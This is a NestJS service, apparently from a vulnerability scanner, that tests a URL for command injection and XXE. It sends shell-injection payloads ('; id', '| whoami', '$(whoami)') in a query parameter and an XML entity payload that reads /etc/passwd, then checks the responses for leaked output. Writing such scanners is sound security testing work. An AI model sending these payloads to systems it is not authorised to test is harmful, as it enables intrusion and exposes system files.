import { Injectable } from "@nestjs/common";
import { Severity, TestStatus } from "@prisma/client";
import axios from "axios";

const CMD_PAYLOAD = ['; id', '| whoami', '$(whoami)']
const XXE_PAYLOAD = `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`;


@Injectable()
export class CommandInjectionService {
    async run(url: string) {
        const findings: {}[] = []

        for (const payload of CMD_PAYLOAD) {
            const testUrl = `${url}?cmd=${encodeURIComponent(payload)}`
            const response = await axios.get(testUrl, { timeout: 5000, validateStatus: () => true })
            if (String(response.data).match(/uid=\d+.*gid=\d+/)) {
                findings.push({ type: "command-injection", payload })
            }

        }
        try {
            const res = await axios.post(url, XXE_PAYLOAD, {
                headers: { "Content-Type": "application/xml" },
                timeout: 5000,
                validateStatus: () => true
            })
            if (String(res.data).includes("root:x:")) {
                findings.push({ type: "xxe", evidence: '/etc/passwd leaked via XML entity' })
            }
        } catch (error) {
            console.log(error)
        }
        return {
            status: findings.length ? TestStatus.FAILED : TestStatus.PASSED,
            severity: findings.length ? Severity.CRITICAL : null,
            data: { findings }
        }
    }
}   